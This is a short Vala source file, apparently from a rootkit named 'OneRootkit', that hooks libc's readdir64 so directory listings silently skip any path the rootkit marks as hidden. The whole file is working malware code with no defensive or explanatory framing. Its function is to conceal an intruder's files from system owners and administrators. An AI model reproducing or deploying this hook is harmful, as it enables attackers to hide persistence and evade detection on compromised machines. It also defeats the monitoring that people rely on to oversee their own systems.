using Posix;

delegate unowned Posix.DirEnt64* Readdir64Method (Posix.Dir dir);

public static Posix.DirEnt64* readdir64 (Posix.Dir dir)
{
	Readdir64Method oldReaddir64 = (Readdir64Method) DLHandles.LIBC().GetMethod("readdir64");
	string fullPath = OneRootkit.GetFullDirPath(dir);

	DirEnt64* current;

	while (true)
	{
		current = oldReaddir64(dir);

		if(current == null)
		{
			return current;
		}

		string currentEntry = fullPath + "/" + (string) ((DirEnt64)current).d_name;

		if(!OneRootkit.IsPathHidden(currentEntry))
		{
			return current;
		}
	}

	return current;
}